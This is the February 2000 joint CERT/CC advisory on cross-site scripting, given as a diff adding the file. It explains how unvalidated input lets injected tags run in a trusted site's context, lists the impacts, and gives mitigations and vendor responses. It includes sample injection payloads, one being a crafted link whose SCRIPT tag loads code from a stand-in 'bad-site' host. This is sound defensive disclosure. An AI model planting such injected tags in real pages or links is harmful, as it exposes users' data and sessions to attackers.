@@ -1,0 +1,188 @@
+Malicious HTML Tags Embedded in Client Web Requests
+
+This advisory is being published jointly by the CERT Coordination Center, DoD-CERT, the DoD Joint Task Force for Computer Network Defense (JTF-CND), the Federal Computer Incident Response Capability (FedCIRC), and the National Infrastructure Protection Center (NIPC).
+
+Original release date: February 2, 2000
+Last revised: February 3, 2000
+
+A complete revision history is at the end of this file.
+
+Systems Affected
+
+Web browsers
+Web servers that dynamically generate pages based on unvalidated input
+Overview
+
+A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources. This can be a problem when a web server does not adequately ensure that generated pages are properly encoded to prevent unintended execution of scripts, and when input is not validated to prevent malicious HTML from being presented to the user.
+
+I. Description
+
+Background
+
+Most web browsers have the capability to interpret scripts embedded in web pages downloaded from a web server. Such scripts may be written in a variety of scripting languages and are run by the client's browser. Most browsers are installed with the capability to run scripts enabled by default.
+
+Malicious code provided by one client for another client
+
+Sites that host discussion groups with web interfaces have long guarded against a vulnerability where one client embeds malicious HTML tags in a message intended for another client. For example, an attacker might post a message like
+
+Hello message board. This is a message.
+<SCRIPT>malicious code</SCRIPT>
+This is the end of my message.
+When a victim with scripts enabled in their browser reads this message, the malicious code may be executed unexpectedly. Scripting tags that can be embedded in this way include <SCRIPT>, <OBJECT>, <APPLET>, and <EMBED>.
+
+When client-to-client communications are mediated by a server, site developers explicitly recognize that data input is untrustworthy when it is presented to other users. Most discussion group servers either will not accept such input or will encode/filter it before sending anything to other readers.
+
+Malicious code sent inadvertently by a client for itself
+
+Many Internet web sites overlook the possibility that a client may send malicious data intended to be used only by itself. This is an easy mistake to make. After all, why would a user enter malicious code that only the user will see?
+
+However, this situation may occur when the client relies on an untrustworthy source of information when submitting a request. For example, an attacker may construct a malicious link such as
+
+<A HREF="http://example.com/comment.cgi? mycomment=<SCRIPT>malicious code</SCRIPT>"> Click here</A>
+When an unsuspecting user clicks on this link, the URL sent to example.com includes the malicious code. If the web server sends a page back to the user including the value of mycomment, the malicious code may be executed unexpectedly on the client. This example also applies to untrusted links followed in email or newsgroup messages.
+
+Abuse of other tags
+
+In addition to scripting tags, other HTML tags such as the <FORM> tag have the potential to be abused by an attacker. For example, by embedding malicious <FORM> tags at the right place, an intruder can trick users into revealing sensitive information by modifying the behavior of an existing form. Other HTML tags can also be abused to alter the appearance of the page, insert unwanted or offensive images or sounds, or otherwise interfere with the intended appearance and behavior of the page.
+
+Abuse of trust
+
+At the heart of this vulnerability is the violation of trust that results from the "injected" script or HTML running within the security context established for the example.com site. It is, presumably, a site the browser victim is interested in enough to visit and interact with in a trusted fashion. In addition, the security policy of the legitimate server site example.com may also be compromised.
+
+This example explicitly shows the involvement of two sites:
+
+<A HREF="http://example.com/comment.cgi? mycomment=<SCRIPT SRC='http://bad-site/badfile'></SCRIPT>"> Click here</A>
+Note the SRC attribute in the <SCRIPT> tag is explicitly incorporating code from a presumably unauthorized source (bad-site). Both of the previous examples show violations of the same-source origination policy fundamental to most scripting security models:
+
+Netscape Communicator Same Origin Policy
+Microsoft Scriptlet Security
+Because one source is injecting code into pages sent by another source, this vulnerability has also been described as "cross-site" scripting.
+
+At the time of publication, malicious exploitation of this vulnerability has not been reported to the CERT/CC. However, because of the potential for such exploitation, we recommend that organization CIOs, managers, and system administrators aggressively implement the steps listed in the solution section of this document. Technical feedback to appropriate technical, operational, and law enforcement authorities is encouraged.
+
+II. Impact
+
+Users may unintentionally execute scripts written by an attacker when they follow untrusted links in web pages, mail messages, or newsgroup postings. Users may also unknowingly execute malicious scripts when viewing dynamically generated pages based on content provided by other users.
+
+Because the malicious scripts are executed in a context that appears to have originated from the targeted site, the attacker has full access to the document retrieved (depending on the technology chosen by the attacker), and may send data contained in the page back to their site. For example, a malicious script can read fields in a form provided by the real server, then send this data to the attacker.
+
+Note that the access that an intruder has to the Document Object Model (DOM) is dependent on the security architecture of the language chosen by the attacker. Specifically, Java applets do not provide the attacker with any access to the DOM.
+
+Alternatively, the attacker may be able to embed script code that has additional interactions with the legitimate web server without alerting the victim. For example, the attacker could develop an exploit that posted data to a different page on the legitimate web server.
+
+Also, even if the victim's web browser does not support scripting, an attacker can alter the appearance of a page, modify its behavior, or otherwise interfere with normal operation.
+
+The specific impact can vary greatly depending on the language selected by the attacker and the configuration of any authentic pages involved in the attack. Some examples that may not be immediately obvious are included here.
+
+SSL-Encrypted Connections May Be Exposed
+
+The malicious script tags are introduced before the Secure Socket Layer (SSL) encrypted connection is established between the client and the legitimate server. SSL encrypts data sent over this connection, including the malicious code, which is passed in both directions. While ensuring that the client and server are communicating without snooping, SSL makes no attempt to validate the legitimacy of data transmitted.
+
+Because there really is a legitimate dialog between the client and the server, SSL reports no problems. Malicious code that attempts to connect to a non-SSL URL may generate warning messages about the insecure connection, but the attacker can circumvent this warning simply by running an SSL-capable web server.
+
+Attacks May Be Persistent Through Poisoned Cookies
+
+Once malicious code is executing that appears to have come from the authentic web site, cookies may be modified to make the attack persistent. Specifically, if the vulnerable web site uses a field from the cookie in the dynamic generation of pages, the cookie may be modified by the attacker to include malicious code. Future visits to the affected web site (even from trusted links) will be compromised when the site requests the cookie and displays a page based on the field containing the code.
+
+Attacker May Access Restricted Web Sites from the Client
+
+By constructing a malicious URL an attacker may be able to execute script code on the client machine that exposes data from a vulnerable server inside the client's intranet.
+
+The attacker may gain unauthorized web access to an intranet web server if the compromised client has cached authentication for the targeted server. There is no requirement for the attacker to masquerade as any particular system. An attacker only needs to identify a vulnerable intranet server and convince the user to visit an innocent looking page to expose potentially sensitive data on the intranet server.
+
+Domain Based Security Policies May Be Violated
+
+If your browser is configured to allow execution of scripting languages from some hosts or domains while preventing this access from others, attackers may be able to violate this policy.
+
+By embedding malicious script tags in a request sent to a server that is allowed to execute scripts, an attacker may gain this privilege as well. For example, Internet Explorer security "zones" can be subverted by this technique.
+
+Use of Less-Common Character Sets May Present Additional Risk
+
+Browsers interpret the information they receive according to the character set chosen by the user if no character set is specified in the page returned by the web server. However, many web sites fail to explicitly specify the character set (even if they encode or filter characters with special meaning in the ISO-8859-1), leaving users of alternate character sets at risk.
+
+Attacker May Alter the Behavior of Forms
+
+Under some conditions, an attacker may be able to modify the behavior of forms, including how results are submitted.
+
+III. Solution
+
+Solutions for Users
+
+None of the solutions that web users can take are complete solutions. In the end, it is up to web page developers to modify their pages to eliminate these types of problems.
+
+However, web users have two basic options to reduce their risk of being attacked through this vulnerability. The first, disabling scripting languages in their browser, provides the most protection but has the side effect for many users of disabling functionality that is important to them. Users should select this option when they require the lowest possible level of risk.
+
+The second solution, being selective about how they initially visit a web site, will significantly reduce a user's exposure while still maintaining functionality. Users should understand that they are accepting more risk when they select this option, but are doing so in order to preserve functionality that is important to them.
+
+Unfortunately, it is not possible to quantify the risk difference between these two options. Users who decide to continue operating their browsers with scripting languages enabled should periodically revisit the CERT/CC web site for updates, as well as review other sources of security information to learn of any increases in threat or risk related to this vulnerability.
+
+Web Users Should Disable Scripting Languages in Their Browsers
+
+Exploiting this vulnerability to execute code requires that some form of embedded scripting language be enabled in the victim's browser. The most significant impact of this vulnerability can be avoided by disabling all scripting languages.
+
+Note that attackers may still be able to influence the appearance of content provided by the legitimate site by embedding other HTML tags in the URL. Malicious use of the <FORM> tag in particular is not prevented by disabling scripting languages.
+
+Detailed instructions to disable scripting languages in your browser are available from our Malicious Code FAQ:
+
+http://www.cert.org/tech_tips/malicious_code_FAQ.html
+Web Users Should Not Engage in Promiscuous Browsing
+
+Some users are unable or unwilling to disable scripting languages completely. While disabling these scripting capabilities is the most effective solution, there are some techniques that can be used to reduce a user's exposure to this vulnerability.
+
+Since the most significant variations of this vulnerability involve cross-site scripting (the insertion of tags into another site's web page), users can gain some protection by being selective about how they initially visit a web site. Typing addresses directly into the browser (or using securely stored local bookmarks) is likely to be the safest way of connecting to a site.
+
+Users should be aware that even links to unimportant sites may expose other local systems on the network if the client's system resides behind a firewall, or if the client has cached credentials to access other web servers (e.g., for an intranet). For this reason, cautious web browsing is not a comparable substitute for disabling scripting.
+
+With scripting enabled, visual inspection of links does not protect users from following malicious links, since the attacker's web site may use a script to misrepresent the links in the user's window. For example, the contents of the Goto and Status bars in Netscape are controllable by JavaScript.
+
+Solutions for Web Page Developers and Web Site Administrators
+
+Web Page Developers Should Recode Dynamically Generated Pages to Validate Output
+
+Web site administrators and developers can prevent their sites from being abused in conjunction with this vulnerability by ensuring that dynamically generated pages do not contain undesired tags.
+
+Attempting to remove dangerous meta-characters from the input stream leaves a number of risks unaddressed. We encourage developers to restrict variables used in the construction of pages to those characters that are explicitly allowed and to check those variables during the generation of the output page.
+
+In addition, web pages should explicitly set a character set to an appropriate value in all dynamically generated pages.
+
+Because encoding and filtering data is such an important step in responding to this vulnerability, and because it is a complicated issue, the CERT/CC has written a document which explores this issue in more detail:
+
+http://www.cert.org/tech_tips/malicious_code_mitigation.html
+Web Server Administrators Should Apply a Patch From Their Vendor
+
+Some web server products include dynamically generated pages in the default installation. Even if your site does not include dynamic pages developed locally, your web server may still be vulnerable. For example, your server may include malicious tags in the "404 Not Found" page generated by your web server.
+
+Web server administrators are encouraged to apply patches as suggested by your vendor to address this problem. Appendix A contains information provided by vendors for this advisory. We will update the appendix as we receive more information. If you do not see your vendor's name, the CERT/CC did not hear from that vendor. Please contact your vendor directly.
+
+Appendix A. Vendor Information
+
+Apache
+
+More information from apache can be found at
+
+http://www.apache.org/info/css-security
+iPlanet - A Sun-Netscape Alliance
+
+Additional information from iPlanet can be found at:
+http://developer.iplanet.com/docs/technote/security/cert_ca2000_02.html
+Microsoft
+
+Microsoft is providing information and assistance on this issue for its customers. This information will be posted at www.microsoft.com/security/.
+Sun Microsystems, Inc.
+
+Please see recommendations for Java Web Server at:
+
+http://sun.com/software/jwebserver/faq/jwsca-2000-02.html
+Sun is also providing information on security issues in general.  This information is posted at
+http://java.sun.com/security
+A good introduction is in http://java.sun.com/sfaq
+While any web-based object, including Java Applets, can be unintentionally loaded through the mechanisms described in this advisory, once they are loaded the Java security mechanisms prevent any harmful information from being disclosed or client information from being damaged.
+
+Our thanks to Marc Slemko, Apache Software Foundation member; Iris Associates; iPlanet; the Microsoft Security Response Center, the Microsoft Internet Explorer Security Team, and Microsoft Research.
+
+Copyright 2000 Carnegie Mellon University.
+
+Revision History
+
+February 2, 2000: Initial release.
+February 3, 2000: Clarifications on impact of Java applets. New vendor information.
